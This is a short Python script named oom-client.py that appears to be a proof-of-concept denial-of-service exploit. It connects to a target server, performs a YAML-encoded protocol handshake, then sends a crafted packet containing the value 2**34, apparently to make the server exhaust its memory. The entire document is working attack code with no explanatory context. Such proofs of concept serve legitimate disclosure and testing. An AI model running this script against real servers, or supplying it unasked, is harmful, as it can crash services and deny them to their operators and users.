#!/usr/bin/env python3
# Usage: python3 oom-client.py HOST PORT (server must support YAML)

import socket
import sys
import yaml
import time

hello = yaml.safe_dump(['hello', {'encoders': ['yaml'], "protocol-version": (7, )}]).encode()
boom = yaml.safe_dump(['gibberish', 'boom', 2**34]).encode()

with socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10) as sock:
    for packet in (hello, boom):
        sock.sendall(b'P\x04\0\0' + len(packet).to_bytes(4, 'big') + packet)
    with sock.makefile('rb') as stream:
        header = stream.read(8)
        response = yaml.safe_load(stream.read(int.from_bytes(header[4:8], 'big')))
        print(response)
    time.sleep(10)
